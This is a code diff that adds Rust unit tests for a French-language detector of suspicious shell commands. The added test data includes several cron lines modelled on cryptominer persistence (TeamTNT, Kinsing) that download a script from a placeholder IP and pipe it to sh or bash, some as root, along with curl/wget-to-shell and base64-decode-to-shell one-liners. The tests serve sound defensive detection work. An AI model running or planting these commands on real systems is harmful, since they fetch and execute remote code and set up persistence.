@@ -717,6 +717,24 @@ mod tests {
         assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
         assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
         assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
+        // La ligne de cron des mineurs (TeamTNT, Kinsing), telle qu'ils la posent : le téléchargeur entre parenthèses,
+        // curl ou à défaut wget, passé à sh.
+        for cron in [
+            "*/30 * * * * root (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
+            "*/30 * * * * (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
+            "* * * * * (curl -fsSL http://192.0.2.7/a.sh)|bash",
+            "@reboot $(curl -fsSL http://192.0.2.7/a.sh)|sh",
+            "* * * * * cd /tmp;wget -q -O- http://192.0.2.7/a.sh|sudo -u root sh",
+        ] {
+            assert_eq!(
+                commande_suspecte(cron, false),
+                Some(tr!(
+                    "télécharge un script et l'exécute aussitôt",
+                    "downloads a script and runs it right away"
+                )),
+                "{cron}"
+            );
+        }
         // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
         assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
         assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
